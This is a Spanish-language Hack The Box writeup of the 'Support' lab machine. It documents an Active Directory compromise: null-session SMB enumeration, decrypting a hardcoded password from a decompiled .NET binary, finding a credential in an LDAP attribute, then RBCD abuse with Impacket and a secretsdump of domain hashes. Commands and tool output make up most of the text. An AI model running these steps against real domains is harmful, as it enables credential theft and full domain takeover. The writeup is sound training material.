---
layout: default
title: "Support"
date: 2026-10-20
---
## Support - HTB Writeup
---

## TL;DR 

SMB null session > UserInfo.exe (support-tools share) > decompilación > contraseña hardcodeada (XOR+Base64) > cuenta ldap > LDAP dump autenticado > credencial en atributo "info" > cuenta support > GenericAll sobre DC$ (BloodHound) > RBCD > impersonacion Administrator > DCSync > dominio comprometido 

---

## Reconocimiento General
Como siempre corremos la enumeracion de puertos abiertos
```
# rustscan -a $IP --ulimit 1000 -r 1-65535 -- -A -sC -Pn | tee rustout
```
Puertos abiertos:
- **53** TCP/UDP DNS 
- **88** TCP/UDP Kerberos 
- **135** TCP MSRPC  RPC 
- **139** TCP NetBIOS SMB 
- **389** TCP/UDP LDAP 
- **445** TCP SMB / CIFS 
- **464** TCP/UDP Kerberos 
- **593** TCP HTTP RPC / EPMRPC sobre HTTP 
- **636** TCP LDAPS 
- **3268** TCP Global Catalog (GC)
- **3269** TCP Global Catalog SSL
- **5985** TCP WinRM (HTTP)
- **9389** TCP AD Web Services / SOAP
- **49664** TCP MSRPC (Ephemeral)Puerto dinámico de RPC 
- **49667** TCP MSRPC (Ephemeral)Puerto dinámico de RPC.
- **49680** TCP MSRPC (Ephemeral)Puerto dinámico de RPC.
- **49692** TCP MSRPC (Ephemeral)Puerto dinámico de RPC.
- **49697** TCP MSRPC (Ephemeral)Puerto dinámico de RPC.
- **49713** TCP MSRPC (Ephemeral)Puerto dinámico de RPC.


### No auth "Null sessions"
Antes de tener cualquier credencial, probaremos null/guest auth en todos lados:

```
# SMB null session
netexec smb "$IP" --generate-krb5-file /tmp/krb5.conf && export KRB5_CONFIG=/tmp/krb5.conf

smbclient -N -L $HOST
```

```
# RPC null session (a veces filtra usuarios, policies, SIDs)
rpcclient -U "" -N $HOST
```

```
# LDAP anónimo
ldapsearch -H ldap://$HOST -x -b "DC=support,DC=htb"
```

```
# DNS zone transfer (rara vez funciona pero es gratis probarlo)
dig axfr $HOST @$IP
```

#### SMB
Despues de ejecutar `netexec` para probar el null session descubrimos que efectivamente existe la posibilidad de autenticarnos mediante smb sin autentificacion (observa el NullAuth:True):
```
# netexec smb "$IP" --generate-krb5-file /tmp/krb5.conf && export KRB5_CONFIG=/tmp/krb5.conf
[*] Adding missing option 'check_guest_account' in config section 'nxc' to nxc.conf
[*] Adding missing section 'BloodHound-CE' to nxc.conf
[*] Adding missing option 'bhce_enabled' in config section 'BloodHound-CE' to nxc.conf
[*] Creating missing folder logs
[*] Creating missing folder modules
[*] Creating missing folder workspaces
[*] Creating missing folder obfuscated_scripts
[*] Creating missing folder screenshots
[*] Creating missing folder logs/sam
[*] Creating missing folder logs/lsa
[*] Creating missing folder logs/ntds
[*] Creating missing folder logs/dpapi
[*] Creating default workspace
[*] Initializing LDAP protocol database
[*] Initializing FTP protocol database
[*] Initializing SMB protocol database
[*] Initializing WINRM protocol database
[*] Initializing RDP protocol database
[*] Initializing SSH protocol database
[*] Initializing MSSQL protocol database
[*] Initializing WMI protocol database
[*] Initializing NFS protocol database
[*] Initializing VNC protocol database
SMB         10.129.138.98   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.138.98   445    DC               [+] krb5 conf saved to: /tmp/krb5.conf
SMB         10.129.138.98   445    DC               [+] Run the following command to use the conf file: export KRB5_CONFIG=/tmp/krb5.conf
```


#### RPC 
Nos damos cuenta que RPC tambien tiene NullAuth, al ejecutar `rpcclient`  tenemos acceso y aunque no parece haber nada interesante al inicio, en realidad conseguimos el **domain SID** con `lsaquery`, esto es un hallazgo pequeño.
```
rpcclient -U '' -N "$HOST"
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
rpcclient $> enumdomgroups
result was NT_STATUS_ACCESS_DENIED
rpcclient $> querydominfo
result was NT_STATUS_ACCESS_DENIED
rpcclient $> lsaquery
Domain Name: SUPPORT
Domain Sid: S-1-5-21-1677581083-3380853377-188903654
rpcclient $> 
```

Aunque `enumdomusers` esté denegado, muchos DCs mal configurados permiten `lookupsids` (SID → nombre) a través de la misma sesión nula. Eso se llama **RID cycling / RID brute forcing** osea que en vez de pedir todos los users (que requiere privilegios), pides “¿quién es el RID 1000? ¿1001? ¿1002?...” uno por uno, lo cual a veces sí está permitido.

Asi que dentro de rpcclient, lo probamos a ver si esta permitido:
```        
rpcclient $> lookupsids S-1-5-21-1677581083-3380853377-188903654-1000
result was NT_STATUS_ACCESS_DENIED
rpcclient $>
```
En este caso no funciono pero si hubiera funcionado, podriamos automatizarlo con la herramienta `lookupsid.py` lo que hace es que barre rangos de RIDs por ejemplo 500-1200.


#### LDAP
Poniendo el siguiente comando nos damos cuenta que ldap esta cerrado a vistas sin credenciales, por ahora no podemos enumerar usuarios:
```
ldapsearch -H ldap://$HOST -x -b "DC=support,DC=htb"  
# extended LDIF
#
# LDAPv3
# base <DC=support,DC=htb> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A5A, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4f7c

# numResponses: 1
```
tambien se podria haber enumerado usando `netexec`:
```
# netexec ldap $HOST -u '' -p ''
LDAP        10.129.138.98   389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:support.htb) (signing:None) (channel binding:No TLS cert) 
LDAP        10.129.138.98   389    DC               [-] Error in searchRequest -> operationsError: 000004DC: LdapErr: DSID-0C090A5A, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4f7c
LDAP        10.129.138.98   389    DC               [+] support.htb\: 
```

#### DNS zone tranfer
Normalmente no funciona pero pues no perdemos nada en hacerlo jajaja
```
# dig axfr "$HOST" @"$IP"                                                                            

; <<>> DiG 9.18.44-1~deb12u1-Debian <<>> axfr support.htb @10.129.138.98
;; global options: +cmd
; Transfer failed.
```
Como lo esperado, esto no funciono pero bueno si hubiera funcionado nos habria dado subdominios interesantes que a lo mejor con fuerza bruta no hubieran aparecido.

---
## Foothold
Como nada de lo que intentamos funciono a excepcion de SMB, pues ya sabemos por donde va el ataque, asi que despues de confirmar el NullAuth ejecutamos `smbmap` para poder listar de forma comoda los archivos y ver los permisos de lectura de estos
```
# smbmap -H $HOST -u "anonymous" -p ""

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.8 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 10.129.138.98:445	Name: support.htb         	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share 
	support-tools                                     	READ ONLY	support staff tools
	SYSVOL                                            	NO ACCESS	Logon server share 
[*] Closed 1 connections    
```
Solo tenemos acceso de lectura a 2 listas 
- IPC$                                              	READ ONLY	Remote IPC
- support-tools                                 READ ONLY	 support

Asi sabiendo eso ahora revisaremos la lista `support-tools ` a ver si hay algo interesante, ya que IPC$ no es un filesystem navegable, es para llamadas RPC nombradas ademas que en la parte de arriba confirmamos que no hay RID cycling por esa via (no nos lo permite) asi que abandonaremos esa rama y listaremos `suport-tools`.

```
# smbclient -N //$HOST/support-tools
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jul 20 12:01:06 2022
  ..                                  D        0  Sat May 28 06:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 06:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 06:19:55 2022
  putty.exe                           A  1273576  Sat May 28 06:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 06:19:31 2022
  UserInfo.exe.zip                    A   277499  Wed Jul 20 12:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 06:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 06:19:43 2022

		4026367 blocks of size 4096. 968812 blocks available
smb: \> exit
```
Si analizas con cuidado el output puedes ver que six de seven son herramientas portables estandard que cualquier sysadmin tendria en su kit, no es hay interesante excepto por `UserInfo.exe.zip` esa no es una herramienta conocida, ademas que tiene un nombre bastante llamativo. **La asimetria es una señal** 

Asi que sabiendo eso procederemos a descargarlo para ver que es
```
smb: \> get UserInfo.exe.zip
getting file \UserInfo.exe.zip of size 277499 as UserInfo.exe.zip (108.3 KiloBytes/sec) (average 108.3 KiloBytes/sec)
smb: \> exit
```

Lo descargamos y analizamos:
```
# unzip UserInfo.exe.zip
Archive:  UserInfo.exe.zip
  inflating: UserInfo.exe            
  inflating: CommandLineParser.dll   
  inflating: Microsoft.Bcl.AsyncInterfaces.dll  
  inflating: Microsoft.Extensions.DependencyInjection.Abstractions.dll  
  inflating: Microsoft.Extensions.DependencyInjection.dll  
  inflating: Microsoft.Extensions.Logging.Abstractions.dll  
  inflating: System.Buffers.dll      
  inflating: System.Memory.dll       
  inflating: System.Numerics.Vectors.dll  
  inflating: System.Runtime.CompilerServices.Unsafe.dll  
  inflating: System.Threading.Tasks.Extensions.dll  
  inflating: UserInfo.exe.config     
```

```
# file UserInfo.exe      
UserInfo.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections
```
El file lo que hace es decirnos que tipo de archivo es, en este caso es un **ensablado .NET** (PE32 executable (console) Intel 80386 Mono/.Net assembly) 

---

### Autenticacion como "ldap"


Como es **.NET** se puede decompilar casi a código fuente legible (a diferencia de C/C++, el bytecode .NET conserva muchísima estructura).  Asi que sabiendo esto vamos a descompilar con **ilspycmd** ya que es un ensamblado .NET
```
# mkdir -p decompiled

# ilspycmd UserInfo.exe -o ./decompiled

# cd decompiled

# /workspace/decompiled # ls
UserInfo.decompiled.cs
```

Al hacer un `cat` vemos algo interesante:
```
private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";
private static byte[] key = Encoding.ASCII.GetBytes("armando");

public static string getPassword()
{
    byte[] array = Convert.FromBase64String(enc_password);
    for (int i = 0; i < array.Length; i++)
    {
        array2[i] = (byte)((uint)(array[i] ^ key[i % key.Length]) ^ 0xDFu);
    }
    return Encoding.Default.GetString(array2);
}
```
Esto es un **XOR de dos capas con clave repetitiva**, criptográficamente hablando es basura XOR con clave corta y repetida es de lo más débil que existe, se rompe hasta a mano, pero funcionalmente es 100% reversible porque XOR es su propia inversa: `(x XOR k) XOR k = x`. No necesitas la “clave privada” de nada, solo repetir exactamente la misma operación.

Asi que replicaremos la logica en python
```
# nano pass.py
```

```
import base64

enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key = b"armando"

raw = base64.b64decode(enc_password)
result = bytearray()
for i, b in enumerate(raw):
    result.append((b ^ key[i % len(key)]) ^ 0xDF)

print(result.decode())
```

Abrimos:
```
# python3 pass.py          
nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

Con la pass ya nos podemos conectar y gracias a haber leido el codigo sabemos que el user es "ldap" asi que tenemos todo para intentar conectarnos:
```
# netexec smb "$HOST" -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
SMB         10.129.230.181  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.230.181  445    DC               [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz 
```
Con este output confirmamos que `support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz` son credenciales validas, esto nos permitira volver a intentar todo lo que nos daba `ACCESS_DENIED` por utilizar sesion nula en ldap. 

Ya autenticados lo primero que haremos sera correr `bloodhound-python` para no perder tiempo y que el mismo grafo nos muestre el camino por donde atacar.
```
# bloodhound-python -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -d $HOST -ns $IP -c All --zip
```

Mientras esto corre podemos revisar si podemos enumerar usuarios directamente mediante LDAP o si podemos ver shares nuevos o con mas permisos:
```
netexec ldap $HOST -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --users


netexec smb $HOST -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --shares
```

Listado de users mediante LDAP autenticado:
```
# netexec smb "$HOST" -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --users

SMB         10.129.230.181  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.230.181  445    DC               [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz 
SMB         10.129.230.181  445    DC               -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.129.230.181  445    DC               Administrator                 2022-07-19 17:55:56 0       Built-in account for administering the computer/domain 
SMB         10.129.230.181  445    DC               Guest                         2022-05-28 11:18:55 0       Built-in account for guest access to the computer/domain 
SMB         10.129.230.181  445    DC               krbtgt                        2022-05-28 11:03:43 0       Key Distribution Center Service Account 
SMB         10.129.230.181  445    DC               ldap                          2022-05-28 11:11:46 0        
SMB         10.129.230.181  445    DC               support                       2022-05-28 11:12:00 0        
SMB         10.129.230.181  445    DC               smith.rosario                 2022-05-28 11:12:19 0        
SMB         10.129.230.181  445    DC               hernandez.stanley             2022-05-28 11:12:34 0        
SMB         10.129.230.181  445    DC               wilson.shelby                 2022-05-28 11:12:50 0        
SMB         10.129.230.181  445    DC               anderson.damian               2022-05-28 11:13:05 0        
SMB         10.129.230.181  445    DC               thomas.raphael                2022-05-28 11:13:21 0        
SMB         10.129.230.181  445    DC               levine.leopoldo               2022-05-28 11:13:37 0        
SMB         10.129.230.181  445    DC               raven.clifton                 2022-05-28 11:13:53 0        
SMB         10.129.230.181  445    DC               bardot.mary                   2022-05-28 11:14:08 0        
SMB         10.129.230.181  445    DC               cromwell.gerard               2022-05-28 11:14:24 0        
SMB         10.129.230.181  445    DC               monroe.david                  2022-05-28 11:14:39 0        
SMB         10.129.230.181  445    DC               west.laura                    2022-05-28 11:14:55 0        
SMB         10.129.230.181  445    DC               langley.lucy                  2022-05-28 11:15:10 0        
SMB         10.129.230.181  445    DC               daughtler.mabel               2022-05-28 11:15:26 0        
SMB         10.129.230.181  445    DC               stoll.rachelle                2022-05-28 11:15:42 0        
SMB         10.129.230.181  445    DC               ford.victoria                 2022-05-28 11:15:58 0        
SMB         10.129.230.181  445    DC               [*] Enumerated 20 local users: SUPPORT
```

Listado de shares (ahora con autenticacion)
```
# netexec smb "$HOST" -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --shares

SMB         10.129.230.181  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.230.181  445    DC               [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz 
SMB         10.129.230.181  445    DC               [*] Enumerated shares
SMB         10.129.230.181  445    DC               Share           Permissions     Remark
SMB         10.129.230.181  445    DC               -----           -----------     ------
SMB         10.129.230.181  445    DC               ADMIN$                          Remote Admin
SMB         10.129.230.181  445    DC               C$                              Default share
SMB         10.129.230.181  445    DC               IPC$            READ            Remote IPC
SMB         10.129.230.181  445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.230.181  445    DC               support-tools   READ            support staff tools
SMB         10.129.230.181  445    DC               SYSVOL          READ            Logon server share 
```
##### Viendo que no hay cosas que a simple vista parezcan interesantes ahora haremos **Authenticated Low-Priv Recon** 

---

### Autenticacion como "support"

Para esto a mi me gusta pedir **TODOS** los atributos dentro de ldap search y luego filtrar los resultados para ver si hay algo interesante
```
ldapsearch -H ldap://$HOST -x -b "DC=support,DC=htb" -D "ldap@support.htb" -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' "(objectClass=user)" "*" | tee full_dump.ldif
```

**Como el output normalmente es ENORME, prefiero filtrar por patrones "sospechosos":**

```
grep -E "^[a-zA-Z]+: [A-Za-z0-9+/]{20,}={0,2}$" full_dump.ldif
```
(busca cualquier cosa que tenga texto largo sin espacios estilo base64)

```
grep "^[a-zA-Z]*:" full_dump.ldif | cut -d: -f1 | sort -u
```
(ver que atributos aparecen)

Y por casualidad, increiblemente el primer output encontro esto 
```
grep -E "^[a-zA-Z]+: [A-Za-z0-9+/]{20,}={0,2}$" full_dump.ldif
objectClass: organizationalPerson
objectClass: organizationalPerson
objectClass: organizationalPerson
servicePrincipalName: RestrictedKrbHost/DC
objectClass: organizationalPerson
objectClass: organizationalPerson
objectClass: organizationalPerson
info: Ironside47pleasure40Watchful
objectClass: organizationalPerson
objectClass: organizationalPerson
objectClass: organizationalPerson
objectClass: organizationalPerson
objectClass: organizationalPerson
objectClass: organizationalPerson
objectClass: organizationalPerson
objectClass: organizationalPerson
objectClass: organizationalPerson
objectClass: organizationalPerson
objectClass: organizationalPerson
objectClass: organizationalPerson
objectClass: organizationalPerson
objectClass: organizationalPerson
objectClass: organizationalPerson
```
Lo ves? `info: Ironside47pleasure40Watchful` el campo `info` casi nunca se usa y aqui tiene un valo con forma y estilo de contraseña. Parece justo el tipo de campo donde un admin descuidado meteria una nota que no deberia.

Revisamos de quien es esa contraseña:
```
# grep -B 15 "info: Ironside47pleasure40Watchful" full_dump.ldif | grep -E "^dn:|^sAMAccountName:"

dn: CN=support,CN=Users,DC=support,DC=htb
```
Eso dira a que usuario pertenece ese bloque de LDIF

Validamos:
```
# netexec smb $HOST -u 'support' -p 'Ironside47pleasure40Watchful'
SMB         10.129.230.181  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.230.181  445    DC               [+] support.htb\support:Ironside47pleasure40Watchful 
```
Con esto ya queda confirmado que tenemos dos cuentas validas, pero support suena mucho mas prometedora ya que no es una cuenta de servicio que normalmente corren con pocos privilegios.

Con la nueva cuenta, antes de hacer nada volvemos a hacer recon basico pero ahora con esta cuenta:
```
# netexec smb $HOST -u 'support' -p 'Ironside47pleasure40Watchful' --shares
SMB         10.129.230.181  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.230.181  445    DC               [+] support.htb\support:Ironside47pleasure40Watchful 
SMB         10.129.230.181  445    DC               [*] Enumerated shares
SMB         10.129.230.181  445    DC               Share           Permissions     Remark
SMB         10.129.230.181  445    DC               -----           -----------     ------
SMB         10.129.230.181  445    DC               ADMIN$                          Remote Admin
SMB         10.129.230.181  445    DC               C$                              Default share
SMB         10.129.230.181  445    DC               IPC$            READ            Remote IPC
SMB         10.129.230.181  445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.230.181  445    DC               support-tools   READ            support staff tools
SMB         10.129.230.181  445    DC               SYSVOL          READ            Logon server share 
```
parece que nada interesante por aqui

```
# netexec winrm $HOST -u 'support' -p 'Ironside47pleasure40Watchful'
/root/.pyenv/versions/3.11.14/lib/python3.11/site-packages/requests/__init__.py:113: RequestsDependencyWarning: urllib3 (2.6.3) or chardet (6.0.0.post1)/charset_normalizer (3.4.4) doesn't match a supported version!
  warnings.warn(
WINRM       10.129.230.181  5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:support.htb) 
WINRM       10.129.230.181  5985   DC               [+] support.htb\support:Ironside47pleasure40Watchful (admin)
```
**Con este output confirmamos  WinRM exitoso. **

Una cosa a tomar en cuenta es que netexec con el tag `(admin)` puede estar indicando 2 cosas:
1. El user SI esta en el grupo de administradores locales del DC, en ese caso hay shell privilegios elevados.
2. El usuario solo tiene el PERMISO de conectar via WinRM (osea que esta en "Remote Management Users") pero NO es admin, en ese caso hay una shell de usuario normal. Ya te digo yo que no es admin pero es algo a tener en cuenta

No queda nada mas que probar asi que:
```
# evil-winrm -i $IP -u "support" -p 'Ironside47pleasure40Watchful'
```

****En este punto es donde agarramos la user flag***

Ejecutamos `whoami /groups` para ver en que grupo estamos y si de verdad estamos en el grupo "admin" 
```
*Evil-WinRM* PS C:\Users\support\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
SUPPORT\Shared Support Accounts            Group            S-1-5-21-1677581083-3380853377-188903654-1103 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
```

Como era de esperarse no estamos en el grupo admin asi que ejecutaremos `whoami /priv` para ver los privilegios especial es asignados, son los que abren otras rutas de escalada

```
*Evil-WinRM* PS C:\Users\support\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```
no hay privilegios de escalada local obvios (no SeImpersonate, no SeBackup, nada tipo PrintSpoofer/JuicyPotato). Tambien revise `net user support` pero era cuenta normal, sin nada especial visible.

Conclusión: no hay escalada LOCAL evidente desde este shell. Como siempre lo que haremos sera que como ya soy un usuario autenticado del dominio, revisare que PERMISOS tiene esta cuenta sobre otros objetos de AD (no en el sistema operativo, sino en el directorio). Para esto como siempre BloodHound.

![](/assets/support.png)

BloodHound me enseña claramente el `GenericAll`, sabiendo que tenemos el `SeMachineAccountPrivilege` podemos confirmar RBCD.

---
## Privesc

#### RBCD
Sabemos que debemos ejecutar un ataque RBCD asi que primero**crearemos la maquina falsa:**
```
# addcomputer.py -computer-name 'SHUTDOWN$' -computer-pass 'Password123!' -dc-host DC -domain-netbios "$HOST" "$HOST"/support:'Ironside47pleasure40Watchful'
Impacket (Exegol fork) v0.14.0.dev0+20260120.113623.b52b6449 - Copyright Fortra, LLC and its affiliated companies 

[*] Successfully added machine account SHUTDOWN$ with password Password123!.
```
Esto lo que hace es que usa tu privilegio `SeMachineAccountPrivilege` (o la cuota default de MachineAccountQuota) para registrar un objeto Computer nuevo en el dominio, con una contraseña que tu eliges y controlas.

**Configuraremos el RBCD en el objeto DC**
```
# rbcd.py -delegate-from "SHUTDOWN$" -delegate-to 'DC$' -dc-ip "$IP" -action write "$HOST"/support:'Ironside47pleasure40Watchful'
Impacket (Exegol fork) v0.14.0.dev0+20260120.113623.b52b6449 - Copyright Fortra, LLC and its affiliated companies 

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] SHUTDOWN$ can now impersonate users on DC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     SHUTDOWN$    (S-1-5-21-1677581083-3380853377-188903654-6101)
```
Esto lo que hace es que usa tu `GenericAll` sobre `DC$` para escribir el atributo `msDS-AllowedToActOnBehalfOfOtherIdentity`, diciendole al DC “la cuenta `SHUTDOWN$` tiene permiso de impersonar hacia ti”. `-delegate-from` es quien va a poder impersonar, `-delegate-to` es el objeto que acepta esa delegación (en este caso el propio DC).


**Pediremos el Service Ticket impersonando a Administrador**
```
# getST.py -spn CIFS/DC.support.htb -impersonate Administrator -dc-ip "$IP" "$HOST"/SHUTDOWN$:'Password123!'
Impacket (Exegol fork) v0.14.0.dev0+20260120.113623.b52b6449 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@CIFS_DC.support.htb@SUPPORT.HTB.ccache
```
Lo que hace es el intercambio **S4U2Self** (la cuenta `SHUTDOWN$` pide un ticket para si misma, demostrando que es quien dice ser) seguido de **S4U2Proxy** ( que usa ese ticket para pedir, “en nombre de Administrator”, acceso al servicio `CIFS/DC.support.htb`, el DC lo permite porque configuramos esa delegación en el paso 2.

`-spn 'CIFS/...'` define para que servicio especifico pides el ticket. `CIFS` te da acceso a SMB (archivos, `psexec`, `secretsdump`), que es suficiente para dumpear el DC completo, no necesitamos mas.

Esto te genera un archivo `.ccache` (Kerberos credential cache) con el ticket impersonado. 

**Como siguiente paso... usaremos el ticket**
```
export KRB5CCNAME=Administrator@CIFS_DC.support.htb@SUPPORT.HTB.ccache
```
Tenemos que exportar `KRB5CCNAME` porque es una variable de entorno que define **donde vive el “cache” de credenciales Kerberos activo**, el archivo que contiene tus tickets (TGT, Service Tickets) ya obtenidos, para no tener que volver a autenticarte en cada operacion. 

**Una ves con eso exportado ahora podemos hacer dump de hashes**
```
# secretsdump -k -no-pass -dc-ip "$IP" "$HOST"/Administrator@DC.$HOST
```
`-k` le dice a impacket que use Kerberos en vez de NTLM, `-no-pass` porque la autenticacion ya está en el ticket, y toma el ticket del `KRB5CCNAME` que acabas de exportar.

**Y tenemos compromiso total del dominio**
```
secretsdump -k -no-pass -dc-ip "$IP" "$HOST"/Administrator@DC.$HOST
Impacket (Exegol fork) v0.14.0.dev0+20260120.113623.b52b6449 - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xf678b2597ade18d88784ee424ddc0d1a
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:bb06cbc02b39abeddd1335bc30b19e26:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
SUPPORT\DC$:aes256-cts-hmac-sha1-96:50be66e5e431c6aabc6906ac894e19c6e5b291955e4452b1994177e34bbeb6f8
SUPPORT\DC$:aes128-cts-hmac-sha1-96:8c6b2c2c881412724a1304216c0410ea
SUPPORT\DC$:des-cbc-md5:89106e1c3efddc1a
SUPPORT\DC$:plain_password_hex:bcfe2ac336e19ac2adc010c876f7c9009dfc96b3cab7d7e9dc4c8ef6784122d8527cbaa92164f37cc5ba1ccd12a924b9dab813a2edc6a68fe6a803ce0e3e5ca284437a7975202cca195f15e0a57425e0b82cc1ceea040a39e8ca3f0b4224aebe6dd3510a1b5d0c5a9d9f60d108aeda88eaab3cefa3d8ef29ae9d00bad35e88839eceb72910b381c3d9a7d5a40f015beebe85b79f89da463ab5ed379c031522d6825e33604b53d65e0823a9c2afbf0b7ffe4c969b5d0dd701b3578ad88fbf0efad623c29628948bc031b4f2080f18bf2329d34fdcaa8ae56813d2d7c4c373690edd91f27a061db52c2c4f2d94dba7f9a3
SUPPORT\DC$:aad3b435b51404eeaad3b435b51404ee:f1480cd5c23e9016ae55e3390cde9a1e:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x5f39b9187072640dd3b9ebc53cdcbd2cda166279
dpapi_userkey:0xc98d4a2ff3c17181eaaad459d6383cff7c72bc2d
[*] NL$KM 
 0000   D7 80 3F C7 76 67 B3 22  E7 C9 9B 98 33 D7 F1 A4   ..?.vg."....3...
 0010   E9 EE B2 38 B7 E0 34 5F  12 36 AB 44 F2 4F 75 7D   ...8..4_.6.D.Ou}
 0020   56 22 0F 0F 3C 2D 2E 4C  E6 FD 61 01 63 A4 32 B4   V"..<-.L..a.c.2.
 0030   CE 66 7B DB E7 CF 28 F8  4C 9E 9C 46 A0 61 1B 8B   .f{...(.L..F.a..
NL$KM:d7803fc77667b322e7c99b9833d7f1a4e9eeb238b7e0345f1236ab44f24f757d56220f0f3c2d2e4ce6fd610163a432b4ce667bdbe7cf28f84c9e9c46a0611b8b
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:bb06cbc02b39abeddd1335bc30b19e26:::
